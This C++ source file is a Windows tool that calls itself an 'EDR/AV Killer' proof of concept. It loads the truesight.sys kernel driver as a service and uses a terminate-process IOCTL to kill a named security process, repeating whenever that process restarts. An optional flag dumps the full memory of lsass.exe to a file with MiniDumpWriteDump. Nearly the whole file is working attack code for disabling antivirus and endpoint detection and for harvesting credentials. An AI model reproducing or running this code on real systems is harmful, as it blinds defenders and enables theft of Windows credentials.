#include <windows.h>
#include <iostream>

#define TERMINATE_PROCESS_IOCTL_CODE 0x22e044
#define STATUS_SUCCESS                   ((NTSTATUS)0x00000000L)    // ntsubauth
#define InitializeObjectAttributes(p, n, a, r, s) { \
    (p)->Length = sizeof(OBJECT_ATTRIBUTES);        \
    (p)->RootDirectory = r;                          \
    (p)->Attributes = a;                             \
    (p)->ObjectName = n;                             \
    (p)->SecurityDescriptor = s;                     \
    (p)->SecurityQualityOfService = NULL;            \
}

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING;

typedef struct _SYSTEM_PROCESS_INFO
{
    ULONG                   NextEntryOffset;
    ULONG                   NumberOfThreads;
    LARGE_INTEGER           Reserved[3];
    LARGE_INTEGER           CreateTime;
    LARGE_INTEGER           UserTime;
    LARGE_INTEGER           KernelTime;
    UNICODE_STRING          ImageName;
    ULONG                   BasePriority;
    HANDLE                  ProcessId;
    HANDLE                  InheritedFromProcessId;
} SYSTEM_PROCESS_INFO, *PSYSTEM_PROCESS_INFO;



typedef enum _SYSTEM_INFORMATION_CLASS {
    SystemBasicInformation = 0,
    SystemPerformanceInformation = 2,
    SystemTimeOfDayInformation = 3,
    SystemProcessInformation = 5,
    SystemProcessorPerformanceInformation = 8,
    SystemInterruptInformation = 23,
    SystemExceptionInformation = 33,
    SystemRegistryQuotaInformation = 37,
    SystemLookasideInformation = 45,
    SystemCodeIntegrityInformation = 103,
    SystemPolicyInformation = 134,
} SYSTEM_INFORMATION_CLASS;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    UNICODE_STRING* ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;


typedef struct _MINIDUMP_INCLUDE_THREAD_CALLBACK {
    ULONG ThreadId;
} MINIDUMP_INCLUDE_THREAD_CALLBACK, *PMINIDUMP_INCLUDE_THREAD_CALLBACK;

typedef struct _MINIDUMP_INCLUDE_MODULE_CALLBACK {
    ULONG64 BaseOfImage;
} MINIDUMP_INCLUDE_MODULE_CALLBACK, *PMINIDUMP_INCLUDE_MODULE_CALLBACK;


typedef struct _MINIDUMP_IO_CALLBACK {
    HANDLE  Handle;
    ULONG   Offset;
    PVOID   Buffer;
    ULONG   BufferBytes;
} MINIDUMP_IO_CALLBACK, *PMINIDUMP_IO_CALLBACK;


typedef struct _MINIDUMP_EXCEPTION_INFORMATION {
    DWORD               ThreadId;
    PEXCEPTION_POINTERS ExceptionPointers;
    BOOL                ClientPointers;
} MINIDUMP_EXCEPTION_INFORMATION, *PMINIDUMP_EXCEPTION_INFORMATION;


typedef struct _MINIDUMP_MODULE_CALLBACK {
    PWCHAR FullPath;
    ULONG64 BaseOfImage;
    ULONG SizeOfImage;
    ULONG CheckSum;
    ULONG TimeDateStamp;
    VS_FIXEDFILEINFO VersionInfo;
    PVOID CvRecord;
    ULONG SizeOfCvRecord;
    PVOID MiscRecord;
    ULONG SizeOfMiscRecord;
} MINIDUMP_MODULE_CALLBACK, *PMINIDUMP_MODULE_CALLBACK;

typedef struct _MINIDUMP_READ_MEMORY_FAILURE_CALLBACK {
    ULONG64 Offset;
    ULONG   Bytes;
    HRESULT FailureStatus;
} MINIDUMP_READ_MEMORY_FAILURE_CALLBACK, *PMINIDUMP_READ_MEMORY_FAILURE_CALLBACK;


typedef struct _MINIDUMP_THREAD_CALLBACK {
    ULONG ThreadId;
    HANDLE ThreadHandle;
    CONTEXT Context;
    ULONG SizeOfContext;
    ULONG64 StackBase;
    ULONG64 StackEnd;
} MINIDUMP_THREAD_CALLBACK, *PMINIDUMP_THREAD_CALLBACK;



typedef struct _MINIDUMP_THREAD_EX_CALLBACK {
    ULONG ThreadId;
    HANDLE ThreadHandle;
    CONTEXT Context;
    ULONG SizeOfContext;
    ULONG64 StackBase;
    ULONG64 StackEnd;
    ULONG64 BackingStoreBase;
    ULONG64 BackingStoreEnd;
} MINIDUMP_THREAD_EX_CALLBACK, *PMINIDUMP_THREAD_EX_CALLBACK;

typedef enum _MINIDUMP_TYPE {
  MiniDumpNormal = 0x00000000,
  MiniDumpWithDataSegs = 0x00000001,
  MiniDumpWithFullMemory = 0x00000002,
  MiniDumpWithHandleData = 0x00000004,
  MiniDumpFilterMemory = 0x00000008,
  MiniDumpScanMemory = 0x00000010,
  MiniDumpWithUnloadedModules = 0x00000020,
  MiniDumpWithIndirectlyReferencedMemory = 0x00000040,
  MiniDumpFilterModulePaths = 0x00000080,
  MiniDumpWithProcessThreadData = 0x00000100,
  MiniDumpWithPrivateReadWriteMemory = 0x00000200,
  MiniDumpWithoutOptionalData = 0x00000400,
  MiniDumpWithFullMemoryInfo = 0x00000800,
  MiniDumpWithThreadInfo = 0x00001000,
  MiniDumpWithCodeSegs = 0x00002000,
  MiniDumpWithoutAuxiliaryState = 0x00004000,
  MiniDumpWithFullAuxiliaryState = 0x00008000,
  MiniDumpWithPrivateWriteCopyMemory = 0x00010000,
  MiniDumpIgnoreInaccessibleMemory = 0x00020000,
  MiniDumpWithTokenInformation = 0x00040000,
  MiniDumpWithModuleHeaders = 0x00080000,
  MiniDumpFilterTriage = 0x00100000,
  MiniDumpWithAvxXStateContext = 0x00200000,
  MiniDumpWithIptTrace = 0x00400000,
  MiniDumpScanInaccessiblePartialPages = 0x00800000,
  MiniDumpFilterWriteCombinedMemory,
  MiniDumpValidTypeFlags = 0x01ffffff
} MINIDUMP_TYPE;

typedef struct _MINIDUMP_USER_STREAM {
    ULONG32 Type;
    ULONG   BufferSize;
    PVOID   Buffer;
} MINIDUMP_USER_STREAM, *PMINIDUMP_USER_STREAM;

typedef struct _MINIDUMP_USER_STREAM_INFORMATION {
    ULONG                 UserStreamCount;
    PMINIDUMP_USER_STREAM UserStreamArray;
} MINIDUMP_USER_STREAM_INFORMATION, *PMINIDUMP_USER_STREAM_INFORMATION;

typedef struct _MINIDUMP_VM_QUERY_CALLBACK {
    ULONG64 Offset;
} MINIDUMP_VM_QUERY_CALLBACK, *PMINIDUMP_VM_QUERY_CALLBACK;

typedef enum _MINIDUMP_CALLBACK_TYPE {
    ModuleCallback,
    ThreadCallback,
    ThreadExCallback,
    IncludeThreadCallback,
    IncludeModuleCallback,
    MemoryCallback,
    CancelCallback,
    WriteKernelMinidumpCallback,
    KernelMinidumpStatusCallback,
    RemoveMemoryCallback,
    IncludeVmRegionCallback,
    IoStartCallback,
    IoWriteAllCallback,
    IoFinishCallback,
    ReadMemoryFailureCallback,
    SecondaryFlagsCallback,
    IsProcessSnapshotCallback,
    VmStartCallback,
    VmQueryCallback,
    VmPreReadCallback,
} MINIDUMP_CALLBACK_TYPE;

typedef struct _MINIDUMP_CALLBACK_INPUT {
    ULONG32 ProcessId;
    HANDLE  ProcessHandle;
    ULONG   CallbackType;
    union {
        MINIDUMP_THREAD_CALLBACK Thread;
        MINIDUMP_THREAD_EX_CALLBACK ThreadEx;
        MINIDUMP_INCLUDE_THREAD_CALLBACK IncludeThread;
        MINIDUMP_MODULE_CALLBACK Module;
        MINIDUMP_INCLUDE_MODULE_CALLBACK IncludeModule;
        MINIDUMP_IO_CALLBACK Io;
        MINIDUMP_READ_MEMORY_FAILURE_CALLBACK ReadMemoryFailure;
        MINIDUMP_VM_QUERY_CALLBACK VmQuery;
    } DUMMYUNIONNAME;
} MINIDUMP_CALLBACK_INPUT, *PMINIDUMP_CALLBACK_INPUT;

typedef struct _MINIDUMP_CALLBACK_OUTPUT {
    union {
        ULONG ModuleWriteFlags;
        ULONG ThreadWriteFlags;
        ULONG SecondaryFlags;
        struct {
            ULONG64 MemoryBase;
            ULONG MemorySize;
        } DUMMYSTRUCTNAME;
        struct {
            HANDLE Handle;
            ULONG Size;
            ULONG64 Base;
        } DUMMYSTRUCTNAME2;
        BOOL CheckCancel;
    } DUMMYUNIONNAME;
} MINIDUMP_CALLBACK_OUTPUT, *PMINIDUMP_CALLBACK_OUTPUT;

typedef
BOOL
(WINAPI * MINIDUMP_CALLBACK_ROUTINE) (
    _Inout_ PVOID CallbackParam,
    _In_    PMINIDUMP_CALLBACK_INPUT CallbackInput,
    _Inout_ PMINIDUMP_CALLBACK_OUTPUT CallbackOutput
    );

typedef struct _MINIDUMP_CALLBACK_INFORMATION {
    MINIDUMP_CALLBACK_ROUTINE CallbackRoutine;
    PVOID CallbackParam;
} MINIDUMP_CALLBACK_INFORMATION, *PMINIDUMP_CALLBACK_INFORMATION;


typedef BOOL(WINAPI* _MiniDumpWriteDump)(
    HANDLE                            hProcess,
    DWORD                             ProcessId,
    HANDLE                            hFile,
    MINIDUMP_TYPE                     DumpType,
    PMINIDUMP_EXCEPTION_INFORMATION  ExceptionParam,
    PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,
    PMINIDUMP_CALLBACK_INFORMATION   CallbackParam
    );

typedef NTSTATUS(NTAPI* _ZwOpenProcess)(
    PHANDLE            ProcessHandle,
    ACCESS_MASK        DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PCLIENT_ID         ClientId
);

typedef NTSTATUS(NTAPI* _ZwClose)(
    HANDLE Handle
);

typedef NTSTATUS (NTAPI *_NtQuerySystemInformation)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);


_NtQuerySystemInformation NtQuerySystemInformation;
volatile BOOL continueLoop = TRUE;

VOID toLowerCase(wchar_t* str) {
    for (int i = 0; str[i] != '\0'; i++) {
        if (str[i] >= 'A' && str[i] <= 'Z') {
            str[i] = str[i] + 32;
        }
    }
}

BOOL WINAPI CtrlHandler(DWORD fdwCtrlType) {
    if (fdwCtrlType == CTRL_C_EVENT) {
        std::wcout << L"\n[!] CTRL+C received. Stopping...\n";
        continueLoop = FALSE;
        return TRUE;
    }
    return FALSE;
}

BOOL CheckIfPID(DWORD pid, wchar_t** processName) {
   
    ULONG size = 0;
    NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &size);
    PSYSTEM_PROCESS_INFO spi = (PSYSTEM_PROCESS_INFO)malloc(size);

    if (NtQuerySystemInformation(SystemProcessInformation, spi, size, &size) != STATUS_SUCCESS) {
        std::wcout << L"[-] Failed to get SystemProcessInformation" << std::endl; // "Failed to get SystemProcessInformation
        free(spi);
        return FALSE;
    }
    
    PSYSTEM_PROCESS_INFO current = spi;
    do {
        if ((DWORD)(current->ProcessId) == pid) {
            std::wstring currentProcessName(current->ImageName.Buffer, current->ImageName.Length / sizeof(wchar_t));
            toLowerCase(&currentProcessName[0]);
            *processName = current->ImageName.Buffer;
            std::wcout << L"[+] Process name: " << current->ImageName.Buffer << std::endl;
            free(spi);
            return TRUE;
        }
        current = (PSYSTEM_PROCESS_INFO)(((LPBYTE)current) + current->NextEntryOffset);
    } while (current->NextEntryOffset != 0);

    free(spi);
    return FALSE;
}

DWORD CheckIfProcessName(wchar_t* processName) {
    std::wcout << L"[+] Checking if process name: " << processName << L" is running" << std::endl;
    ULONG size = 0;
    NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &size);

    PSYSTEM_PROCESS_INFO spi = (PSYSTEM_PROCESS_INFO)malloc(size);

    if (NtQuerySystemInformation(SystemProcessInformation, spi, size, &size) != STATUS_SUCCESS) {
        std::wcout << L"[-] Failed to get SystemProcessInformation" << std::endl; // "Failed to get SystemProcessInformation
        free(spi);
        return FALSE;
    }
    
    PSYSTEM_PROCESS_INFO current = spi;
    do {
        if (current->ImageName.Buffer) {
            std::wstring currentProcessName(current->ImageName.Buffer, current->ImageName.Length / sizeof(wchar_t));
            toLowerCase(&currentProcessName[0]);
            std::wstring processNameW(processName);
            toLowerCase(&processNameW[0]);
            
            if (processNameW.compare(currentProcessName) == 0) {
                DWORD processId = (DWORD)(current->ProcessId);
                free(spi);
                std::wcout << L"[+] Process PID: " << processId << std::endl;
                return processId;
            }
    }
        current = (PSYSTEM_PROCESS_INFO)(((LPBYTE)current) + current->NextEntryOffset);
    } while (current->NextEntryOffset != 0);

    free(spi);
    return NULL;
}

BOOL LoadDriverByName(wchar_t* driverName) {
	SC_HANDLE hSCManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (hSCManager == NULL) {
		std::wcout << L"[-] OpenSCManager failed" << std::endl;
		return FALSE;
	}

	SC_HANDLE hService = OpenServiceW(hSCManager, driverName, SERVICE_ALL_ACCESS);
    if (hService == NULL) {
		// Create the service
        std::wcout << L"[+] Creating service: truesight" << std::endl; // "Creating service
        wchar_t pathCStr[MAX_PATH];

        if (GetCurrentDirectory(MAX_PATH, pathCStr) != 0) {
            wcscat_s(pathCStr, L"\\truesight.sys");
            std::wcout << L"[+] Full path: " << pathCStr << std::endl;

        } else {
            std::wcerr << L"[-] Error getting current directory." << std::endl;
            return FALSE;
        }

        hService = CreateServiceW(
            hSCManager,
            driverName,
            driverName,
            SERVICE_ALL_ACCESS,
            SERVICE_KERNEL_DRIVER,
            SERVICE_DEMAND_START,
            SERVICE_ERROR_IGNORE,
            pathCStr,
            NULL,
            NULL,
            NULL,
            NULL,
            NULL
        );
        if (hService == NULL) {
            std::wcout << L"[-] CreateService failed" << std::endl;
            CloseServiceHandle(hSCManager);
            return FALSE;
        }
	}
    

    if (!StartService(hService, NULL, NULL)) {
        SERVICE_STATUS serviceStatus;

        if (QueryServiceStatus(hService, &serviceStatus)) {
            if (serviceStatus.dwCurrentState == SERVICE_RUNNING) {
                std::wcout << L"[!] Service is already running" << std::endl;
                CloseServiceHandle(hService);
                CloseServiceHandle(hSCManager);
                return TRUE;
            }
        } else {
            std::wcout << L"[-] QueryServiceStatus failed" << std::endl;
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCManager);
            return FALSE;
        }
    
    	std::wcout << L"[-] StartService failed" << std::endl;
		CloseServiceHandle(hService);
		CloseServiceHandle(hSCManager);
		return FALSE;
	}
    std::wcout << L"[+] Driver loaded successfully!" << std::endl;

	CloseServiceHandle(hService);
	CloseServiceHandle(hSCManager);
	return TRUE;
}   

BOOL stopAndDeleteSerivceByName(wchar_t* driverName) {
	SC_HANDLE hSCManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (hSCManager == NULL) {
		std::wcout << L"[-] OpenSCManager failed" << std::endl;
		return FALSE;
	}

	SC_HANDLE hService = OpenServiceW(hSCManager, driverName, SERVICE_ALL_ACCESS);
    if (hService == NULL) {
		std::wcout << L"[-] OpenService failed" << std::endl;
		CloseServiceHandle(hSCManager);
		return FALSE;
	}

	SERVICE_STATUS status;
    if (!ControlService(hService, SERVICE_CONTROL_STOP, &status)) {
		std::wcout << L"[-] ControlService failed" << std::endl;
		CloseServiceHandle(hService);
		CloseServiceHandle(hSCManager);
		return FALSE;
	}

    if (!DeleteService(hService)) {
		std::wcout << L"[-] DeleteService failed" << std::endl;
		CloseServiceHandle(hService);
		CloseServiceHandle(hSCManager);
		return FALSE;
	}

	CloseServiceHandle(hService);
	CloseServiceHandle(hSCManager);
	return TRUE;
}

BOOL isDumpLsass() {
    
    ULONG size = 0;
    std::wstring targetProcess(L"lsass.exe");
    

    DWORD processId = NULL;
    NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &size);

    PSYSTEM_PROCESS_INFO spi = (PSYSTEM_PROCESS_INFO)malloc(size);

    if (NtQuerySystemInformation(SystemProcessInformation, spi, size, &size) != STATUS_SUCCESS) {
        std::wcout << L"[-] Failed to get SystemProcessInformation" << std::endl; // "Failed to get SystemProcessInformation
        free(spi);
        return FALSE;
    }
    
    PSYSTEM_PROCESS_INFO current = spi;
    do {
        if (current->ImageName.Buffer) {
            std::wstring currentProcessName(current->ImageName.Buffer, current->ImageName.Length / sizeof(wchar_t));
            toLowerCase(&currentProcessName[0]);
            
            if (targetProcess.compare(currentProcessName) == 0) {
                processId = (DWORD)(current->ProcessId);
                free(spi);
                std::wcout << L"[+] Lsass.exe PID: " << processId << std::endl;
                break;
            }
    }
        current = (PSYSTEM_PROCESS_INFO)(((LPBYTE)current) + current->NextEntryOffset);
    } while (current->NextEntryOffset != 0);

    
    if (processId == NULL) {
        std::wcout << L"[-] Lsass.exe not found" << std::endl;
        free(spi);
        return FALSE;
    }

    _ZwOpenProcess ZwOpenProcess = (_ZwOpenProcess)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "ZwOpenProcess");
    _ZwClose ZwClose = (_ZwClose)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "ZwClose");

    NTSTATUS status;
    HANDLE hProcess = NULL;
    OBJECT_ATTRIBUTES objectAttributes;
    CLIENT_ID clientId;

    InitializeObjectAttributes(&objectAttributes, NULL, 0, NULL, NULL);
    clientId.UniqueProcess = (HANDLE)processId;
    clientId.UniqueThread = NULL;

    status = ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objectAttributes, &clientId);
    if (status != STATUS_SUCCESS) {
        std::wcout << L"[-] ZwOpenProcess failed" << std::endl;
        return FALSE;
    }
    
    std::wcout << L"[+] Dumping lsass.exe via MiniDumpWriteDump" << std::endl;
    HANDLE hFile = CreateFileW(L"a.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        std::wcout << L"[-] CreateFileA failed" << std::endl;
        ZwClose(hProcess);
        return FALSE;
    }


    _MiniDumpWriteDump MiniDumpWriteDump = (_MiniDumpWriteDump)GetProcAddress(LoadLibraryW(L"Dbghelp.dll"), "MiniDumpWriteDump");
    BOOL result = MiniDumpWriteDump(hProcess, processId, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
    if (!result) {
        std::wcout << L"[-] MiniDumpWriteDump failed" << std::endl;
        ZwClose(hProcess);
        return FALSE;
    }

    ZwClose(hProcess);
    return TRUE;

    
 }


int main(int argc, char** argv) {
    std::wcout << L"Welcome to EDR/AV Killer using truesight driver!" << std::endl;
    std::wcout << L"This is a PoC, use it at your own risk!" << std::endl;
    BOOL isPID = FALSE;
    BOOL isLsass = FALSE;

    // Set the CTRL+C handler
    if (!SetConsoleCtrlHandler(CtrlHandler, TRUE)) {
        std::wcerr << L"[-] Failed to set CTRL+C handler. Exiting...\n";
        return 1;
    }

    // if (argc != 3 || argc != 4) {
    //     std::wcout << L"Usage: " << argv[0] << L" -p <PID> / -n <PROCESS NAME>\n-lsass [OPTIONAL Lsass dump via MiniDumpWriteDump]" << std::endl;
    //     return 1;
    // }

    wchar_t* processName = NULL;
    DWORD pid = 0;

    if (argc != 3 && argc != 4) {
        std::wcout << L"Usage: " << argv[0] << L" -p <PID> / -n <PROCESS NAME>\n-lsass [OPTIONAL Lsass dump via MiniDumpWriteDump]" << std::endl;
        return 1;
    }

    if (strcmp(argv[1], "-p") == 0) {
        isPID = TRUE;
        pid = atoi(argv[2]);

    }
    else if (strcmp(argv[1], "-n") == 0) {
        size_t len = strlen(argv[2]) + 1;
        processName = new wchar_t[len];
        size_t convertedChars = 0;
        mbstowcs_s(&convertedChars, processName, len, argv[2], _TRUNCATE);

    }
    else {
        std::wcout << L"Usage: " << argv[0] << L" -p <PID> / -n <PROCESS NAME>\n-lsass [OPTIONAL Lsass dump via MiniDumpWriteDump]" << std::endl;
        return 1;

    }
    if (argc == 4) {
        if (strcmp(argv[3], "-lsass") == 0) {
            // std::wcout << L"[+] Dumping lsass.exe via MiniDumpWriteDump" << std::endl;
            isLsass = TRUE;
        }
    }
    wchar_t driverName[] = L"trueSight";

    if (!LoadDriverByName(driverName)) {
        return 1;
    }

    NtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation");

    if (isPID) {
        if (!CheckIfPID(pid, &processName)) {
            return 1;
        }
        std::wcout << L"[+] Process name: " << processName << std::endl;
    }
    else {
        pid = CheckIfProcessName(processName);

        if (pid == NULL) {
            std::wcout << L"[+] Process name: " << processName << L" is not running" << std::endl;
            return 1;
        }

    }
    

    HANDLE hDevice = CreateFileW(L"\\\\.\\TrueSight", OPEN_EXISTING | CREATE_NEW, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) {
        std::wcout << L"[-] CreateFileA failed" << std::endl;
        return 1;
    }

    std::wcout << L"[+] Terminating PID: " << pid << std::endl;
    DWORD bytesReturned = 0;



    if (!DeviceIoControl(hDevice, TERMINATE_PROCESS_IOCTL_CODE, &pid, sizeof(DWORD), NULL, 0, &bytesReturned, NULL)) {
        std::wcout << L"[-] DevicesIoControl failed" << std::endl;
        CloseHandle(hDevice);
        return 1;
    }

    if(isLsass){
        if(!isDumpLsass()) {
            std::wcout << L"[-] Dumping lsass.exe failed" << std::endl;
            std::wcout << "[*] Continuing..." << std::endl;
        } else {
            std::wcout << L"[+] Dumped lsass.exe to a.txt file!" << std::endl;
            
        }
    }

    for (;;) {
        Sleep(700);

        if (!continueLoop) {
            break;
        }

        pid = CheckIfProcessName(processName);
        if (pid == NULL) {
            std::wcout << L"[-] Process name: " << processName << L" not running" << std::endl;
            Sleep(1200);
            continue;

        }

        std::wcout << L"[+] Terminating PID: " << pid << std::endl;
        if (!DeviceIoControl(hDevice, TERMINATE_PROCESS_IOCTL_CODE, &pid, sizeof(DWORD), NULL, 0, &bytesReturned, NULL)) {
            std::wcout << L"[-] DevicesIoControl failed" << std::endl;
            continue;
        }

    }

    std::wcout << L"[!] Stoping and Deleting trueSight Service!" << std::endl;
    stopAndDeleteSerivceByName(driverName);
    CloseHandle(hDevice);
    return 0;
}
